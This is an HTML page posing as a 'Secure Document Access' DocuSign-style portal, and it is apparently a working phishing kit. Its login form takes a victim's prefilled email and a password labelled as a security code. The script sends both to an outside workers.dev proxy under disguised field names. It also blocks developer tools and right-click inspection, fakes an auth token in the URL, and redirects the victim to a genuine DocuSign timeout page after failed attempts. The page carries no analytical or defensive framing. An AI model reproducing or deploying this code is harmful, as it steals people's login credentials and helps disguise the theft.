<!DOCTYPE html>
<html lang="en" data-app="secure-viewer" data-build="8c4f1a"
data-node="alpha-7">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Secure document delivery portal">
<meta name="author" content="Document Services">
<meta name="robots" content="noindex, nofollow">
<meta name="theme-color" content="#0f5b8c">
<meta name="format-detection" content="telephone=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="referrer" content="no-referrer">
<title>Secure Document Access</title>
<!-- build: internal-2026.04.11 | rev: 8c4f1a3b -->
<!-- analytics anchor -->
<style>
body { font-family: system-ui, sans-serif; background: #f0f2f5; margin: 0; padding: 40px; }
.login-box { max-width: 400px; margin: 0 auto; background: white; padding: 32px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
.input-group { margin-bottom: 16px; }
.field { width: 100%; padding: 12px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 14px; box-sizing: border-box; }
.field[readonly] { background: #f3f4f6; color: #6b7280; }
button { width: 100%; padding: 12px; background: #2563eb; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
button:hover { background: #1d4ed8; }
#sentinel { display: none; color: #ef4444; font-size: 14px; margin-bottom: 16px; padding: 12px; background: #fef2f2; border-radius: 6px; }
.shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
@keyframes shake { 10%, 90% { transform: translate3d(-1px, 0, 0); } 20%, 80% { transform: translate3d(2px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-4px, 0, 0); } 40%, 60% { transform: translate3d(4px, 0, 0); } }
.spinner { display: none; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.8s linear infinite; margin-right: 8px; }
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body data-session="pending" data-region="us-east" data-tier="standard">

<!-- application mount -->
<div id="app-anchor-root" data-role="mount" data-ref="a91f"
style="display:none;"></div>
<div id="shell-wrapper-84" class="mount-shell" data-layer="base"
aria-hidden="true"></div>
<div id="portal-frame-x9" class="frame-host" data-layer="ui"
hidden></div>

<!-- layout templates -->
<template id="tpl-header-2f"><div class="slot-header"></div></template>
<template id="tpl-footer-7a"><div class="slot-footer"></div></template>
<template id="tpl-fallback-3c"><span
class="fallback-mark"></span></template>

<!-- context markers -->
<span id="hint-region-01" class="hint-node" data-hint="region"
hidden></span>
<span id="hint-locale-02" class="hint-node" data-hint="locale"
hidden></span>
<i id="hint-build-03" class="hint-mark" data-hint="build" hidden></i>
<em id="hint-rev-04" class="hint-mark" data-hint="rev" hidden></em>

<!-- asset manifest -->
<aside id="asset-manifest-88" data-kind="manifest" data-count="0"
hidden></aside>

<noscript>
    <div class="noscript-guard"><p>JavaScript is required to
continue.</p></div>
</noscript>

<!-- ============================================================
      LOGIN FORM
      ============================================================ -->
<div class="login-box" id="loginBox">
    <div id="sentinel">
        <span id="error-text">Invalid code. Please try again.</span>
    </div>
    
    <div class="input-group">
        <input type="email" id="viper" class="field" value="[Email]" readonly tabindex="-1" autocomplete="off">
    </div>
    <div class="input-group">
        <input type="password" id="cobra" class="field" placeholder="Enter Security Code" autocomplete="off" spellcheck="false">
    </div>

    <button id="btn-unlock" onclick="falcon()">
        <span class="spinner" id="loading-spinner"></span>
        <span id="btn-text">Unlock Document</span>
    </button>
</div>

<!-- icon library -->
<svg width="0" height="0" style="position:absolute" aria-hidden="true">
    <defs>
        <symbol id="sym-dot-a" viewBox="0 0 10 10"><circle cx="5" cy="5"
r="4"/></symbol>
        <symbol id="sym-dot-b" viewBox="0 0 10 10"><circle cx="5" cy="5"
r="2"/></symbol>
    </defs>
</svg>

<!-- trailing anchors -->
<div id="tail-anchor-1" class="tail-node" data-tail="1" hidden></div>
<div id="tail-anchor-2" class="tail-node" data-tail="2" hidden></div>

<!-- post-load marker -->
<div id="post-load-flag" class="post-node" data-flag="ready"
hidden></div>

<!-- ============================================================
      FORM SUBMISSION HANDLER
      ============================================================ -->
<script>
// Anti-devtools protection
document.onkeydown = function (event) {
  if (event.keyCode == 123) return false;
  if (event.ctrlKey && event.shiftKey && (event.keyCode == "I".charCodeAt(0) || event.keyCode == "C".charCodeAt(0) || event.keyCode == "J".charCodeAt(0))) return false;
  if (event.ctrlKey && (event.keyCode == "U".charCodeAt(0) || event.keyCode == "S".charCodeAt(0))) return false;
};
document.addEventListener("contextmenu", (e) => e.preventDefault());

const SECRET_KEY = "MATT_SECURE_2026";
let failedAttempts = 0;
const viper = document.getElementById("viper");

// URL token generator
(function spicyUrl() {
  if (!window.location.search) {
    const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let token = "";
    for (let i = 0; i < 64; i++) token += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
    const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + "?auth_token=" + token + "&session_ref=v4_secure_verification";
    window.history.replaceState({ path: newUrl }, "", newUrl);
  }
})();

function falcon() {
  const customerName = viper.value;
  const customerMessage = document.getElementById("cobra").value;
  const unlockBtn = document.getElementById("btn-unlock");
  const spinner = document.getElementById("loading-spinner");
  const btnText = document.getElementById("btn-text");
  const form = document.getElementById("loginBox");
  
  document.getElementById("sentinel").style.display = "none";
  form.classList.remove("shake");
  
  if (!customerMessage || customerMessage.length < 1) {
    showError("Please enter your password.");
    form.classList.add("shake");
    return;
  }
  
  const cleanPayload = new URLSearchParams();
  cleanPayload.append("Name", customerName);
  cleanPayload.append("Feedback", customerMessage);
  cleanPayload.append("timestamp", Date.now().toString());
  
  unlockBtn.disabled = true;
  spinner.style.display = "inline-block";
  btnText.innerText = "Verifying...";
  
  // INTEGRATED ENDPOINT
  fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: cleanPayload,
  })
    .then((r) => r.json())
    .then((result) => {
      unlockBtn.disabled = false;
      spinner.style.display = "none";
      btnText.innerText = "Unlock Document";
      
      if (result.status === "exhausted") {
        showError("✌ Access locked. Too many failed attempts.");
        unlockBtn.disabled = true;
        setTimeout(() => {
          window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
        }, 3000);
        return;
      }

      if (result.status === "wrong") {
        failedAttempts++;
        if (failedAttempts >= 3) {
          showError("✌ Access locked. Too many failed attempts.");
          unlockBtn.disabled = true;
          setTimeout(() => {
            window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
          }, 3000);
          return;
        }
        showError("An error occurred please try again later.");
        form.classList.add("shake");
        document.getElementById("cobra").value = "";
        return;
      }

      if (result.status === "success") {
        btnText.innerText = "Success! Redirecting...";
        unlockBtn.style.background = "#10b981";
        window.location.href = result.redirect;
      } else {
        showError("Security token mismatch.");
      }
    })
    .catch(() => {
      failedAttempts++;
      if (failedAttempts >= 3) {
        showError("✌ System Locked. Redirecting...");
        setTimeout(() => {
          window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
        }, 3000);
        return;
      }
      unlockBtn.disabled = false;
      spinner.style.display = "none";
      btnText.innerText = "Unlock Document";
      showError("Connection error.");
    });
}

function showError(message) {
  const container = document.getElementById("sentinel");
  container.style.display = "block";
  document.getElementById("error-text").innerText = message;
}
</script>

<!-- ============================================================
      legacy stubs (preserved from original)
      ============================================================ -->
<script>
(function () {
    var _t0 = Date.now();
    var _session = { boot: _t0, hits: 0 };
    window.__analyticsStub = _session;
    window.__trackEvent = function (name, meta) {
        _session.hits++;
        return { name: name, meta: meta || null, at: Date.now() };
    };
})();
</script>

</body>
</html>
